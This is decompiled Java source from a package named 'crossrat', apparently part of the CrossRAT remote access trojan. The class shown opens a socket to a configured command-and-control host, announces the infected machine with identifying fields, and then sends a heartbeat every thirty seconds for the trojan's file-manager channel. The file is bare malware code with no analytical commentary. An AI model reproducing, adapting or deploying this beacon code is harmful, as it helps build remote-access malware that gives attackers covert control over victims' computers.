/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.e;
import crossrat.k;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;

final class f
extends Thread {
    f() {
    }

    @Override
    public final void run() {
        new crossrat.e();
        Object object = null;
        try {
            System.err.println("FILE MANAGER CONNECT");
            object = new Socket(k.b, k.c);
            k.l = object;
            DataOutputStream dataOutputStream = new DataOutputStream(object.getOutputStream());
            dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.z + k.d + "&&&");
            do {
                dataOutputStream = new DataOutputStream(k.l.getOutputStream());
                dataOutputStream.writeBytes(String.valueOf(k.A) + k.d + "&&&");
                try {
                    Thread.sleep(30000L);
                }
                catch (Exception exception) {}
            } while (true);
        }
        catch (Exception exception) {
            try {
                object.close();
            }
            catch (IOException iOException) {
                object = iOException;
                iOException.printStackTrace();
            }
            System.err.println("FILE MANAGER ERROR CONNECT");
            return;
        }
    }
}
